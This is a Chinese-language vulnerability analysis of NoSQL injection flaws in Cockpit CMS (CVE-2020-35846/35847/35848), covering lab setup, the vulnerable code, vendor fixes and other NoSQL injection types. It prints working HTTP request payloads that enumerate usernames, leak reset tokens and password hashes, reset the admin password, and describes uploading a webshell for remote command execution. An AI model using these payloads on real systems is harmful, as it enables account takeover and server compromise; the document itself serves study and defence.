# CockpitCMS NoSQL注入漏洞分析

阅读量 **234718**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-17 14:30:08

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t0155bc9ec9a47062ad.png)

## 前言

在网络攻击方法中，SQL注入一直是最流行的攻击之一，随着NoSQL数据库，如MongoDB、Redis的出现，传统的SQL注入不再可行。但是这并不意味着NoSQL数据库就百分百安全。NoSQL注入漏洞第一次由Diaspora在2010年发现，到现在，NoSQL注入和SQL注入一样，如果开发者不注重，同样会对企业服务器造成致命威胁。

这次，根据PHP CMS Cockpit中存在的几个漏洞，来学习NoSQL
Injection。这几个漏洞被分配了3个CVE，分别是CVE-2020-35848、CVE-2020-35847和CVE-2020-35846。

从这个例子中，我们可以看到一个简单的NoSQL注入是如何一步步得到管理员权限，最后造成RCE严重后果的。

## 环境搭建

直接使用docker搭建，推荐cockpit自带的dockerfile：

    
    
    FROM php:7.3-apache
    
    RUN apt-get update \
        && apt-get install -y \
            wget zip unzip \
            libzip-dev \
            libfreetype6-dev \
            libjpeg62-turbo-dev \
            libpng-dev \
            sqlite3 libsqlite3-dev \
            libssl-dev \
        && pecl install mongodb \
        && pecl install redis \
        && docker-php-ext-configure gd --with-freetype-dir=/usr/include/ --with-jpeg-dir=/usr/include/ \
        && docker-php-ext-install -j$(nproc) iconv gd pdo zip opcache pdo_sqlite \
        && a2enmod rewrite expires
    
    RUN echo "extension=mongodb.so" > /usr/local/etc/php/conf.d/mongodb.ini
    RUN echo "extension=redis.so" > /usr/local/etc/php/conf.d/redis.ini
    
    RUN chown -R www-data:www-data /var/www/html
    
    VOLUME /var/www/html
    
    CMD ["apache2-foreground"]
    

上面的dockerfile文件会搭建一个支持nosql数据库的httpd服务。但cockpit CMS还没有安装。需要进入docker
exec进入容器内部自行下载安装。

然后访问 http://your-ip:8000/cockpit/install/index.php
，先进行自动安装。初始密码为`admin/admin`。

安装完成后访问 http://your-ip:8000/cockpit/index.php 页面即可登录。

## 漏洞1：/auth/check

打开burp，在登录页面抓个包，尝试下面的payload：

    
    
    POST /cockpit/auth/check HTTP/1.1
    Host: 
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    X-Requested-With: XMLHttpRequest
    Content-Type: application/json; charset=UTF-8
    Content-Length: 168
    Connection: close
    
    {
        "auth":{
            "user":{
                "$eq": "admin"
            },
            "password":[
                0
            ]
        },
        "csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
    }
    

![](https://p4.ssl.qhimg.com/t01e1e3e3f196e82c24.png)

我们查看相对应的源码`modules/Cockpit/module/auth.php`，可以看到：

![](https://p1.ssl.qhimg.com/t016d6f372fec51c19b.png)

我们可以看到，在`modules/Cockpit/module/auth.php`文件的第33行，首先，程序会查找用户是否存在用户是否存在，只有在用户存在的情况下，才会执行第35行if条件句中的`password_verify()`逻辑（`&&`运算符是短路求值，或者说是惰性求值）。所以如果返回的结果是
**password_verify() expects parameter 1 to be string** ，则说明，`$user =
admin`在数据库中是存在的，`$app->storage->findOne()`成功返回了查询结果。

而上述漏洞的关键点在于，`$filter['user']`从`$data['user']`获取到之后，在被传入`$app->storage->findOne`进行数据库查询之前，完全没有经过过滤。因此，我们可以通过MongoDB操作符来进行NoSQL
注入。

在这里，我们可以总结一些可用的MongoDB操作符注入姿势。

###  $eq

`$eq`表示equal。是MongoDB中的比较操作符。

语法：

    
    
    {
        <field>: { $eq: <value> }
    }
    

###  $regex

`$regex`是MongoDB的正则表达式操作符，用来设置匹配字符串的正则表达式。`$regex`操作符是在MongoDB盲注中最经常被使用的，我们可以借助它来一个一个字符地爆破数据库。

语法：

    
    
    {
        <field>: { $regex: /pattern/, $options: '<options>' } 
    }
    {
        <field>: { $regex: 'pattern', $options: '<options>' }
    }
    {
        <field>: { $regex: /pattern/<options>}
    }
    

其中`<options>`是模式修正符，在MongoDB中包含`i`，`m`，`x`和`s`四个选项。

我们可以用`$regex`进行盲注，来猜测用户名，比如：

    
    
    POST /cockpit/auth/check HTTP/1.1
    Host: 
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    X-Requested-With: XMLHttpRequest
    Content-Type: application/json; charset=UTF-8
    Content-Length: 169
    Connection: close
    
    {
        "auth":{
            "user":{
                "$regex": "a.*"
            },
            "password":[
                0
            ]
        },
        "csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
    }
    

![](https://p0.ssl.qhimg.com/t0199ebaf19d7a16055.png)

说明用户名以`a`开头的用户存在。

`"$regex": "ab.*"`：

![](https://p1.ssl.qhimg.com/t0110ea6a1423238443.png)

以`ab`开头的用户不存在，那返回的信息自然是 **User not found** 。

###  $nin

`$nin`表示查询时不匹配数组中的值，语法：

    
    
    {
        field: { $nin: [ <value1>, <value2>, ..., <valueN> ] }
    }
    

比如现在后台一共有4个用户：

![](https://p0.ssl.qhimg.com/t01979d6dff87df5f2c.png)

如果我们已经知道了用户admin，Poseidon和Sirens，那么我们还可以用`$nin`来加快盲注暴力破解的速度。

payload：

    
    
    {
        "auth":{
            "user":{
                "$nin": [
                    "admin",
                    "Poseidon",
                    "Sirens"
                ],
                "$regex": "Co.*"
            },
            "password":[
                0
            ]
        },
        "csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
    }
    

![](https://p2.ssl.qhimg.com/t0192211c9ed9306022.png)

再查找以`a`，`P`或是`S`开头的用户就会提示用户不存在。

![](https://p4.ssl.qhimg.com/t018e95b9c9b29d738b.png)

###  自定义$func/$fn/$f 操作符

在Cockpit的 **lib/MongoLite/Database.php**
的[`evaluate`](https://github.com/agentejo/cockpit/blob/0d01412e1209468c23f0f4c49eccf959059e415e/lib/MongoLite/Database.php#L432)函数中重写和新增很多MongoDB操作符，其中`$func`、`$fn`和`$f`操作符比较有意思，因为该操作符允许调用callable
PHP函数：

![](https://p0.ssl.qhimg.com/t0179c40915ee4f309d.png)

`$func`操作符并不是MongoDB中定义的标准操作符，在Cockpit
CMS中，该操作符可以调用任何带有单个参数的PHP标准函数，其中`$b`是我们可控的。

所以我们可以构造这样的payload：

    
    
    {
        "auth":{
            "user":{
                "$func":"var_dump"
            },
            "password":[
                0
            ]
        },
        "csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
    }
    

![](https://p2.ssl.qhimg.com/t01db48c925c0e121d0.png)

一次性得到了全部用户名。

将`$func`换成`$fn`或是`$f`，也是一样的效果：

    
    
    {
        "auth":{
            "user":{
                "$fn":"var_dump"
            },
            "password":[
                0
            ]
        },
        "csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
    }
    

![](https://p0.ssl.qhimg.com/t01500b17cec3195d1a.png)

## 漏洞2：/auth/requestreset

在忘记登录密码的情况下，Cockpit提供了密码重置功能，相关逻辑在`modules/Cockpit/Controller/Auth.php`中，和登录逻辑一样，传入`$this->app->storage->findOne()`进行查询的参数`$query`完全没有经过处理：

![](https://p1.ssl.qhimg.com/t017786a70a1d30b516.png)

在这里，我们可以用相同的方法来获取用户名：

    
    
    POST /cockpit/auth/requestreset HTTP/1.1
    Host: your-ip
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://your-ip:8000/cockpit/auth/forgotpassword
    X-Requested-With: XMLHttpRequest
    Content-Type: application/json; charset=UTF-8
    Content-Length: 33
    Connection: close
    Cookie: 8071dec2be26139e39a170762581c00f=e0050af94b1d4e88d31e7695c2b5142a
    
    {
        "user":{
            "$func":"var_dump"
        }
    }
    

![](https://p0.ssl.qhimg.com/t014461813a33f98bb1.png)

## 漏洞3：/auth/resetpassword

从前面的两处漏洞，已经可以得到后台的用户账户名了。接着我们可以利用漏洞3重置密码。

重置密码功能处理函数为`resetpassword()`，位于文件`modules/Cockpit/Controller/Auth.php`：

![](https://p2.ssl.qhimg.com/t01b84f5814516b749c.png)

在第150行，`$token`参数被传入查询之前，没有经过过滤净化，同样，在这样存在一个相同的漏洞：

    
    
    {
        "token":{
            "$func":"var_dump"
        }
    }
    

![](https://p1.ssl.qhimg.com/t012f476bf851afd605.png)

## 漏洞4：/auth/newpassword

无独有偶，在同文件的`newpassword`中，同样没有对`$token`参数做净化：

![](https://p3.ssl.qhimg.com/t01d707f4153f8dc780.png)

同样存在NoSQL注入漏洞：

![](https://p1.ssl.qhimg.com/t011d964bf0b864404d.png)

###  获取用户密码

当获取了正确了`$token`之后，重新请求`auth/newpassword`：

    
    
    POST /cockpit/auth/newpassword HTTP/1.1
    Host: your-ip
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    X-Requested-With: XMLHttpRequest
    Content-Type: application/json; charset=UTF-8
    Content-Length: 60
    Connection: close
    
    {
        "token":"rp-bb6dfcbc16621bf95234355475d53114609bc6e8c336b"
    }
    

![](https://p0.ssl.qhimg.com/t012a96740d37070320.png)

可以看到，我们得到了admin用户的邮箱信息和hash之后的密码！

hash值`$2y$10$IkeINxb9VlaZUJ5jwyBNdO\/x8QFlCd1UO8zLiZExGDLVFVJtjyoz6`是用PHP
built-in加密函数`password_hash`加密的。如果你有足够大的密码库，我们也可以暴力破解。

###  重置用户密码

如果你没有那么多时间或是设备破解密码，我们可以借助`resetpassword`中的漏洞来直接重置密码：

    
    
    {
        "token":"rp-bb6dfcbc16621bf95234355475d53114609bc6e8c336b",
        "password":"123456hahha"
    }
    

![](https://p4.ssl.qhimg.com/t01ea39f0305fff5cd3.png)

密码重置成功！

## RCE

当我们手握管理员账号密码之后，我们能做的事情就变多变危险了。接下来我们看看能不能向后台上传个webshell。

登录管理员账号，在后台发现了几个可以利用的功能，比如名为`Assets`和`Finder`的功能模块。

![](https://p0.ssl.qhimg.com/t01e40422dd548c9dd8.png)

它们都有一个上传文件的功能，虽然有文件大小限制，但是上传个shell足够了：

![](https://p4.ssl.qhimg.com/t015f75f1ddc8ec8fda.png)

访问我们上传的shell，直接在目标远程服务器上执行命令：

![](https://p1.ssl.qhimg.com/t01aad39da05f9c2f50.png)

## 官方修复

接下来看看开发者是怎么修复这些漏洞的。

###  限制用户传入参数为字符串

**modules/Cockpit/Controller/Auth.php** ：

`check`函数：

![](https://p5.ssl.qhimg.com/t0179f9f59b14e55523.png)

通过限制用户的输入为string类型来防止PHP数组注入。

`newpassword`函数：

![](https://p1.ssl.qhimg.com/t01cfa6e6b1fa878c31.png)

`resetpassword`函数：

![](https://p4.ssl.qhimg.com/t018ebc76ae7e5ffda2.png)

###  移除$func/$fn/$f操作符

**lib/MongoLite/Database.php ：**

![](https://p3.ssl.qhimg.com/t01ef8baa2251c95e67.png)

对于危险操作符`$func`、`$fn`和`$f`，cockpit cms开发者选择的修复方案是直接移除这些操作符来杜绝漏洞。

## NoSQL注入其他方法

当然，NoSQL注入的方法不仅仅是上述攻击cockpit cms中提到的方法，实际上，早在2015年的一篇文章 **No SQL, No
Injection？Examining NoSQL Security** ，来自IBM的安全员Aviv Ron就总结了几种NoSQL注入方法，分别是：

（1）PHP数组注入

（2）MongoDB OR注入

（3）任意JavaScript注入

首先PHP数组注入在CTF比赛以及在PHP
CMS应用数组中最常见，也就是本文主要内容所使用的方法，所以这里就不再赘述了。这里简单介绍一下后面两种方法（内容总结自上面提到的2015年的[文章](https://arxiv.org/ftp/arxiv/papers/1506/1506.04082.pdf)）。

###  MongoDB OR注入

SQL注入漏洞的一个常见原因是从字符串文本构建查询，其中包括未使用适当编码的用户输入。虽然这种注入方式因为JSON查询而变得更难实现，但是也不是完全没有可能的。

一些开发者可能采取这样的方式将用户输入转成JSON，而不是使用PHP自带的array函数：

![](https://p1.ssl.qhimg.com/t01af6f16e1cf254ea4.png)

在正常情况下，拼接后可以得到：

    
    
    { username: 'tolkien', password: 'hobbit' }
    

如果攻击者构造这样的恶意输入：

![](https://p3.ssl.qhimg.com/t018dc8990f7bfbcc60.png)

拼接后的结果为：

![](https://p3.ssl.qhimg.com/t01515ca8f5019af267.png)

`$or`就表示对后面的`[]`中的内容进行OR语句操作，而一个`{}`查询语句永远返回`TRUE`。

所以这条语句就相当于：

    
    
    SELECT * FROM logins WHERE username = 'tolkien' AND (TRUE OR ('a' = 'a' AND password = '')) #successful MongoDB injection
    

只要用户能够提供正确的用户名就可以直接登录，而不需要密码校验。

###  NoSQL JavaScript注入

NoSQL数据库的另一个特性是可以执行JavaScript语句。如果用户的输入为转义或未充分转义，则Javascript执行会暴露一个危险的攻击面。
例如，一个复杂的事物可能需要javascript代码，其中包括一个未转义的用户输入作为查询中的一个参数。

比如以一个商店为例，商店中有一系列商品，每个商品都有价格和金额。开发人员想要获取这些字段的总和或者平均值，开发者编写了一个map
reduce函数，其中`$param`参数接受用户的输入：

![](https://p0.ssl.qhimg.com/t01116f30e79253d8ad.png)

因为没有对用户的输入进行充分的过滤，所以攻击者可以构造这样的payload：

![](https://p4.ssl.qhimg.com/t01a3abdc4d02e502d9.png)

上面代码中绿色的部分的作用是闭合function()函数；红色的部分是攻击者希望执行的任意代码。最后最一部分蓝色的代码调用一个新的map
reduce函数，以平衡注入到原始语句中的代码。

得到的效果为：

![](https://p3.ssl.qhimg.com/t01cbc734f0cacde9f3.png)

如果要防止JavaScript注入攻击，可以直接禁止数据库语句中JavaScript语句的执行（在 _mongod.conf_
中将`javascriptEnabled`设为`false`）或者是 **加强对用户输入的过滤** 。

###  缓解与检测

我们可以看到的是，无论哪种类型的注入方法，它们的防御或者说是缓解措施，最重要的一点就是，永远不要无条件相信用户的输入，对于来自外部的输入，一定要小心小心再小心。

最后，关于检测，我们可以尝试用机器学习的方法，用恶意和正常的NoSQL查询语句建模训练来实现NoSQL注入检测。后来我在调研中发现，已经有研究者这样做过了，并且发表了相关的[论文](https://ieeexplore.ieee.org/document/8754304)。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **serend1pity** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/241113](/post/id/241113)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [代码审计](/tag/代码审计)
  * [NoSQL Injection](/tag/NoSQL Injection)

 **+1** __8赞

 __收藏

![](https://p1.ssl.qhimg.com/t01d39bc53b49850b6e.png) serend1pity

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

